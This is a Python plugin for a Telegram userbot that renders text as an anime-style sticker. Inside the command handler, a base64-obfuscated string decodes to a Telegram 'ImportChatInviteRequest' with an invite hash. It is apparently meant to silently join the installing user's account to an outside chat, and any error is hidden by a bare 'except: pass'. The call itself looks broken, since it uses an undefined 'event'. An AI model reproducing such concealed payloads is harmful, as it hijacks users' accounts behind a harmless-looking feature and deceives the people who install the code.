# imported from ppe-remix by @heyworld & @DeletedUser420
# Translated & Updated by @Sur_vivor
# imported from ppe-remix by @heyworld & @DeletedUser420
# modified by @mrconfused

import pybase64

from fridaybot import CMD_HELP, bot
from fridaybot.modules import deEmojify, waifutxt
from fridaybot.utils import admin_cmd


@borg.on(admin_cmd(outgoing=True, pattern="sttxt(?: |$)(.*)"))
async def waifu(animu):
    text = animu.pattern_match.group(1)
    reply_to_id = animu.message
    if animu.reply_to_msg_id:
        reply_to_id = await animu.get_reply_message()
    if not text:
        if animu.is_reply:
            text = (await animu.get_reply_message()).message
        else:
            await animu.edit("`You haven't written any article, Waifu is going away.`")
            return
    try:
        cat = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(cat)
    except:
        pass
    text = deEmojify(text)
    await animu.delete()
    await waifutxt(text, animu.chat_id, reply_to_id, bot, borg)


CMD_HELP.update(
    {"stickertxt": "`.sttxt` <your txt>\nUSAGE : Anime that makes your writing fun."}
)
